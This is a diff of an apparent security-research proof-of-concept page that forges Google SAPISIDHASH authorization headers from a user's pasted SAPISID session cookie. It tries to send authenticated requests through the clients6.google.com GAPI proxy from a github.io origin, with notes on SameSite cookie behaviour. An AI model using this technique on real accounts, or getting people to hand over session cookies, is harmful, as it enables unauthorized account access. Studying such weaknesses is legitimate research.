@@ -26,15 +26,17 @@ code { color: #ffaa00; }
 <h2>clients6.google.com GAPI Proxy — SAPISIDHASH Authenticated Access Proof</h2>
 
 <div class="section">
-<p class="warn"><b>Confirmed from Caido entry 258957 (real Drive API call):</b></p>
-<pre>Authorization: SAPISIDHASH {ts}_{sha1} SAPISID1PHASH {ts}_{sha1} SAPISID3PHASH {ts}_{sha1}
-Formula: SHA1(ts + " " + SAPISID_value + " " + X-Origin)
-X-Origin = event.origin = our page (https://majdch22.github.io)
-All three APISID cookies have the same value → same sha1 for all three</pre>
-<p class="warn"><b>Authorization IS in Xg allowed-headers</b> → forwarded verbatim by proxy.
-<b>Self-test:</b> On google.com DevTools console run:
-<pre><code>document.cookie.match(/SAPISID=([^;]+)/)?.[1]</code></pre>
-Paste the value below.</p>
+<p class="warn"><b>Confirmed from Caido entry 258957 + live test analysis:</b></p>
+<pre>Formula: SHA1(ts + " " + SAPISID_value + " " + X-Origin) — confirmed CORRECT
+Auth error: "missing" → "invalid" after adding SAPISIDHASH → server IS verifying but fails
+
+ROOT CAUSE: SAPISID is SameSite=Lax → NOT sent in cross-site iframe XHR (top=github.io)
+              Server finds SAPISIDHASH header but no SAPISID cookie to check against → "invalid"
+FIX: Send ONLY "SAPISID3PHASH ts_hash" — __Secure-3PAPISID is SameSite=None → IS sent</pre>
+<p class="warn"><b>Step 1:</b> On google.com DevTools console run BOTH:
+<pre><code>document.cookie.match(/SAPISID=([^;]+)/)?.[1]
+document.cookie.match(/__Secure-3PAPISID=([^;]+)/)?.[1]</code></pre>
+Both should return the same value. Paste YOUR value below (don't use the placeholder!)</p>
 </div>
 
 <div class="section" id="verify-section">
@@ -45,12 +47,16 @@ Paste the value below.</p>
 <div id="verify-result"></div>
 </div>
 
-<label>SAPISID value (just the value after SAPISID=, up to ;):
-<input id="sapisid" placeholder="T4xvGpjW4Y7hiWXy/ARPm88BxfMO-pciPa" />
+<label>SAPISID value — paste YOUR value from google.com DevTools (not the placeholder!):
+<input id="sapisid" placeholder="(paste your own SAPISID value here)" />
 </label>
 
-<button onclick="runTest()">Run Authenticated Test (with SAPISIDHASH)</button>
+<button onclick="runTest('3p-only')">Run — SAPISID3PHASH only (RECOMMENDED)</button>
+<button onclick="runTest('all')">Run — All 3 variants (SAPISIDHASH + 1P + 3P)</button>
 <button onclick="runTest(true)">Run Without Auth (expect 401 — baseline)</button>
+
+<p class="warn" style="font-size:0.9em">SAPISID3PHASH uses <code>__Secure-3PAPISID</code> (SameSite=None → sent in cross-site context).<br>
+All-3-variants includes SAPISIDHASH which uses SAPISID (SameSite=Lax → NOT sent → server can't verify → "invalid").</p>
 
 <hr>
 <div id="log"></div>
@@ -73,14 +79,17 @@ async function sha1(message) {
   return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
 }
 
-async function computeSapisidhashHeader(sapisid, origin) {
+async function computeSapisidhashHeader(sapisid, origin, mode) {
   const ts = Math.floor(Date.now() / 1000);
   const msg = ts + ' ' + sapisid + ' ' + origin;
   const hash = await sha1(msg);
-  // All three variants use the same SAPISID value (confirmed from Caido 258957)
   const token = ts + '_' + hash;
-  const header = 'SAPISIDHASH ' + token + ' SAPISID1PHASH ' + token + ' SAPISID3PHASH ' + token;
-  return { ts, hash, header };
+  // 3p-only: only SAPISID3PHASH (__Secure-3PAPISID is SameSite=None → sent in cross-site context)
+  // all: all three variants (SAPISID might be SameSite=Lax → NOT sent → server returns "invalid")
+  const header = mode === '3p-only'
+    ? 'SAPISID3PHASH ' + token
+    : 'SAPISIDHASH ' + token + ' SAPISID1PHASH ' + token + ' SAPISID3PHASH ' + token;
+  return { ts, hash, header, mode };
 }
 
 async function verifyFormula() {
@@ -104,7 +113,7 @@ let requestSent = false;
 let responseHandled = false;
 let proxyIframe = null;
 
-async function runTest(noAuth) {
+async function runTest(mode) {
   requestSent = false;
   responseHandled = false;
   logEl.innerHTML = '';
@@ -112,22 +121,24 @@ async function runTest(noAuth) {
 
   const sapisid = document.getElementById('sapisid').value.trim();
   const pageOrigin = location.origin;
+  const noAuth = mode === true;
 
   if (!noAuth && !sapisid) {
-    log('warn', 'Enter your SAPISID value first (from google.com DevTools console).');
+    log('warn', 'Enter YOUR SAPISID from google.com DevTools console. Do not use the placeholder!');
+    log('warn', 'Run: document.cookie.match(/SAPISID=([^;]+)/)?.[1]');
     return;
   }
 
   let authHeader = null;
   if (!noAuth && sapisid) {
-    const { ts, hash, header } = await computeSapisidhashHeader(sapisid, pageOrigin);
+    const { ts, hash, header, mode: m } = await computeSapisidhashHeader(sapisid, pageOrigin, mode);
     authHeader = header;
-    log('ok', 'ts=' + ts + ' origin=' + pageOrigin);
-    log('ok', 'sha1input="' + ts + ' ' + sapisid.substring(0,8) + '... ' + pageOrigin + '"');
+    log('ok', 'mode=' + m + ' ts=' + ts + ' origin=' + pageOrigin);
+    log('ok', 'sha1input="' + ts + ' ' + sapisid.substring(0,6) + '...[' + sapisid.length + ' chars] ' + pageOrigin + '"');
     log('ok', 'hash=' + hash);
-    log('ok', 'Authorization: ' + header.substring(0, 80) + '...');
+    log('ok', 'Authorization: ' + header);
   } else {
-    log('warn', 'NO AUTH — baseline test. Expect 401.');
+    log('warn', 'NO AUTH — baseline test. Expect 401 "missing".');
   }
 
   if (typeof gapi !== 'undefined' || document.querySelector('script[src*="apis.google.com"]')) {
